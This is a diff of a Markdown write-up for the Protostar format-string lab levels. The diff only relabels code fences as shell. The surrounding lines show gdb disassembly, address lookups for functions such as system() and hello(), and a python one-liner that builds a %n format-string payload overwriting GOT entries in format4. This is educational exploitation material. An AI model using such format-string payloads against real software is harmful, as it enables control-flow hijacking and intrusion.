@@ -53,7 +53,7 @@ should be done in less than 10 bytes of input.
 
 We take a look at a disassembly of the `vuln()` function.
 
-```
+```shell
 (gdb) disass vuln
 Dump of assembler code for function vuln:
 0x080483f4 <vuln+0>:    push   %ebp
@@ -120,7 +120,7 @@ int main(int argc, char **argv)
 Like before, we want to overwrite `target`. However, this time `target`'s
 location on the stack is very far away from our current location on the stack.
 
-```
+```shell
 (gdb) info reg
 eax            0x0      0
 ecx            0x87cb0d94       -2016735852
@@ -235,7 +235,7 @@ target is 0 :(
 
 With GDB, we find the memory address of `target`.
 
-```
+```shell
 (gdb) print &target
 $2 = (int *) 0x80496e4
 ```
@@ -311,7 +311,7 @@ target is 00000000 :(
 
 We also find the memory address of `target`.
 
-```
+```shell
 (gdb) print &target
 $2 = (int *) 0x80496f4
 ```
@@ -424,7 +424,7 @@ In this level, our goal is to redirect execution to the `hello()` function.
 
 We start by taking a look at the disassembly of the `vuln()` function.
 
-```
+```shell
 (gdb) disass vuln
 Dump of assembler code for function vuln:
 0x080484d2 <vuln+0>:    push   %ebp
@@ -507,7 +507,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 And look for the memory address of the `hello()` function.
 
-```
+```shell
 (gdb) print &hello
 $1 = (void (*)(void)) 0x80484b4 <hello>
 ```
@@ -535,7 +535,7 @@ we can pass our shell command through `stdin` in the second call to `vuln()`.
 
 We look for the memory address of the `system()` and `vuln()` functions.
 
-```
+```shell
 (gdb) print &system
 $1 = (<text variable, no debug info> *) 0xb7ecffb0 <__libc_system>
 (gdb) print &vuln
@@ -544,7 +544,7 @@ $1 = (void (*)(void)) 0x80484d2 <vuln>
 
 We successfully overwrite the GOT entries for `exit()` and `printf()`.
 
-```
+```shell
 user@protostar:~$ python -c "print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08\x1c\x97\x04\x08\x1d\x97\x04\x08\x1e\x97\x04\x08\x1f\x97\x04\x08' + '%x.'*3 + '%n%n%n%n%n%n%n%n'" > a
 (gdb) run < a
 Starting program: /opt/protostar/bin/format4 < a
